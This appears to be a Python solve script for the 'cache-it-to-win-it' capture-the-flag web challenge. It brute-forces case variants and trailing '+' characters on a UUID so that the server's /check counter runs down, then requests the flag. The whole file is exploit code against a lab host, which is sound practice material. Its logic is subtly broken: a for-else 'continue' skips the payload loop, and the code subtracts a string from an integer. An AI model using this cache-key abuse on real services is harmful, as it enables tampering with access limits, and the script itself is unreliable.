import requests as r 
from bs4 import BeautifulSoup 
from itertools import product 

url= "https://cache-it-to-win-it.chall.lac.tf/"

def get_uuid():
    resp = r.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    s = soup.find('title').get_text()
    return s

def check(url, payload):
    url = url+f"/check?uuid={payload}"
    resp = r.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    s = soup.find('p').get_text().split('Only ')[1].split(' ')[0].strip()
    return s 

def flag(url, payload):
    url = url+f"/check?uuid={payload}"
    resp = r.get(url)
    print(resp.text)


# get 3 len uuid
# chars = [None] * 4
# while True:
#     best = 0
#     i = 0
#     uuid = get_uuid()
#     for chunk in uuid.split('-')[1:]:
#         if chunk[0] in 'abcdef':
#             best += 1
#             chars[i] = chunk[0]
#         else:
#             chars[i] = "-"
#         i += 1
        
#     print(f"{uuid}:{best}")
#     if best >= 3:
#         break
# print(uuid)


# seed 
uuid = "d6c27ef8-da9a-445d-b3a5-e1568aa560ef"
split_uuid = uuid.split('-')
print(split_uuid)
# initial
score = check(url, uuid)
print(score)

chars = 'd-be'
# generate lower/upper combinations D-Be
combinations = [''.join(p) for p in product(*[(c.lower(), c.upper()) for c in chars])]
n = 1
score = 0
# generate mixed cases after -
for comb in combinations:
    update = split_uuid[:]
    for i in range(len(update)-1):
        if comb[i] != '-':
            update[i+1] = comb[i] + update[i+1][1:]
    else: continue

    # append increasing trailing characters
    uuid = "-".join(update)
    for i in range(13):
        payload = f"{uuid}{'+'*i}"
        s = check(url, payload)
        print(f"{n}:{s}:{payload}")
        score = 100-s
        n += 1
    if score == 100:
        flag(url, payload)
